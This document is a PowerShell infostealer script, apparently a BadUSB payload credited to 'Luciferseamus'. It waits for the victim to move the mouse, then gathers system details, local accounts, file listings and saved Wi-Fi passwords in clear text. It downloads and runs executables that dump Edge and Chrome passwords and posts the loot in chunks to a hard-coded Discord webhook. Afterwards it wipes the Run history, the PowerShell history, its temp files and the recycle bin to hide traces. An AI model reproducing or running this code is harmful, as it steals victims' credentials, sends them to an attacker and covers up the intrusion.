
#REM CHANGES: Compiled by Luciferseamus
#REM 09/05/2024: - This will grab just the computer Info and send it to a webhook so you can identify the target
#REM 09/10/2024: - There are now two exfil files to choose from.
#REM 09/12/2024: - Now included in the zip are now 2 additional Wait for Mouse Versions of the original pubI.ps1  (WMpubI.ps1) and pubI+P.ps1 (WMpubI+P.ps1) files.

#############################################################################################################################################


function Target-Comes {
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 600
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}




#############################################################################################################################################

Target-Comes


# Turn of capslock if it is left on

$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
if ($caps -eq $true){$key = New-Object -ComObject WScript.Shell;$key.SendKeys('{CapsLock}')}

$D="$env:tmp";
cd $D\pass

$FileName = "${Date}${env:computername}_${Time}.txt";



$Date = Get-Date -Format yyyy-MM-dd;
$Time = Get-Date -Format hh-mm-ss;
dir env:;
$env:computername | Out-File $FileName -Force;
Add-Content -Path “$FileName” -Value “Computer Info";
Get-LocalUser | Where-Object -Property PasswordRequired -Match false | Out-File $FileName -Append;
Get-LocalUser | Out-File $FileName -Append;


Get-CimInstance -ClassName Win32_ComputerSystem | Out-File $FileName -Append;
Get-LocalUser | Where-Object -Property PasswordRequired -Match false | Out-File $FileName -Append;
Get-LocalUser | Out-File $FileName -Append;

Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' | Out-File $FileName -Append;
Get-ChildItem -Path $userDir -Include *.txt, *.doc, *.docx, *.pptx, *.xlsx, *.pdf, *.jpg, *.png, *.mp3, *.mp4, *.zip, *.rar -Recurse | Out-File $FileName -Append;



$networks = (netsh wlan show profiles) | Select-String 'All User Profile\s+:\s(.+)'
foreach ($network in $networks) {
    $name = $network.Matches.Groups[1].Value.Trim()
    $password = (netsh wlan show profile name="$name" key=clear) | Select-String 'Key Content\s+:\s(.+)' | ForEach-Object {
        $_.Matches.Groups[1].Value.Trim()
    }
    [PSCustomObject]@{
        PROFILE_NAME = $name
        PASSWORD = $password
    } | Out-File $FileName -Append;
};


Add-Content -Path “$FileName” -Value “Edge Passwords”; 
     
    $edgeUrl = 'https://github.com/luciferseamus/Browser_exe/raw/main/edge/edge.exe';
    $EdgePath = '.\edge.exe';
    if (-not (Test-Path -Path $EdgePath)) {Invoke-WebRequest -Uri $edgeUrl -OutFile $edgePath;}
$EdgeOutput = & $edgePath | Out-File $FileName -Append;
    

Add-Content -Path “$FileName” -Value “Chrome Passwords”;


    $chromeUrl = 'https://github.com/luciferseamus/Browser_exe/raw/main/chrome/chrome.exe';
    $chromePath = '.\chrome.exe';
    if (-not (Test-Path -Path $chromePath)) {Invoke-WebRequest -Uri $chromeUrl -OutFile $chromePath;}
$chromeOutput = & $chromePath | Out-File $FileName -Append;
   



$args1 = Get-Content .\$FileName;

$statOutput = $args1 | Out-String;
    $webhookUrl = 'https://discord.com/api/webhooks/1256048768206241803/BWYs2QrnsKznXQ9dSCCX4FJVvQvHKn9KpcvXFHJoKL5iWCRW_FWMravdB-8qJfslVn_n';
    $chunks = [Math]::Ceiling($statOutput.Length / 2000);for ($i = 0; $i -lt $chunks; $i++) {$start = $i * 2000;$length = [Math]::Min(2000, $statOutput.Length - $start);$content = $statOutput.Substring($start, $length); 
    $webhookContent = @{'username' = 'V1Ru7EnT';'content' = $content;};  
    $jsonData = ConvertTo-Json -InputObject $webhookContent;IWR -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json';Start-Sleep -Seconds 1;};

########################################################################################################################################################################

cd\;
# empty temp folder
rm $D\pass* -r -Force -ErrorAction SilentlyContinue;

# delete .zip file
rm $D\E.zip -r -Force -ErrorAction SilentlyContinue;

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f;


# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f;

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath;

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue;